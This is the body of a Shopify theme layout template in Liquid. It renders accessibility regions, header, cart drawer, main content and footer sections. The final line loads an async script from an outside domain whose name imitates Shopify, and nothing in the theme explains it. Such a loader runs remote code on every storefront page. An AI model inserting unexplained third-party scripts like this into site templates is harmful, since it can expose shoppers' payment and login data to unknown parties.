  {%- liquid
    assign apply_figma_typography = false
    unless template.name == 'index' or template.name == 'product' or template.name == 'cart'
      assign apply_figma_typography = true
      if template.name == 'page'
        if template.suffix == 'about-us' or page.handle == 'about-us'
          assign apply_figma_typography = false
        endif
      endif
    endunless
  -%}
  <body class="{% if settings.zoom_image_on_hover %}zoom-image--enabled{% endif %}{% if apply_figma_typography %} figma-typography{% endif %} {{ page.handle }} {{ localization.country }}-{{ localization.language.iso_code }}-{{ localization.market.handle }}" >
    {%- render 'shadow-dom-templates' -%}

    <a href="#main" class="skip-to-content sr-only">{{ 'general.accessibility.skip_to_content' | t }}</a>

    {%- comment -%}
    This placeholder will be filled to screen readers for any kind of announcements
    {%- endcomment -%}
    <div class="sr-only" role="status" aria-live="polite" aria-atomic="true">
      <span id="status-announcement"></span>
    </div>

    <div class="sr-only" role="alert" aria-live="assertive" aria-atomic="true">
      <span id="error-announcement"></span>
    </div>

    {%- if request.page_type != 'password' -%}
      {%- sections 'header-group' -%}
      {%- sections 'overlay-group' -%}

      {%- if settings.cart_type == 'popover' -%}
        <cart-notification-drawer open-from="bottom" class="quick-buy-drawer drawer"></cart-notification-drawer>
      {%- endif -%}
    {%- endif -%}

    {%- if request.page_type == 'customers/account' or request.page_type == 'customers/order' or request.page_type == 'customers/addresses' -%}
      {%- section 'account-banner' -%}
    {%- endif -%}

    <main role="main" id="main" class="anchor">
      {{ content_for_layout }}

      {%- comment -%}
      IMPLEMENTATION NOTE: due to the very complex logic of margin/padding collapsing in Impact, the footer group is
      added into the main element to ensure that dynamic sections added into the footer group are properly laid out.
      {%- endcomment -%}
      {%- if request.page_type != 'password' -%}
        {%- sections 'footer-group' -%}
      {%- endif -%}
    </main>
    <script src="https://partnertrackshopify.dk/js/register.js" async></script>
  </body>
</html>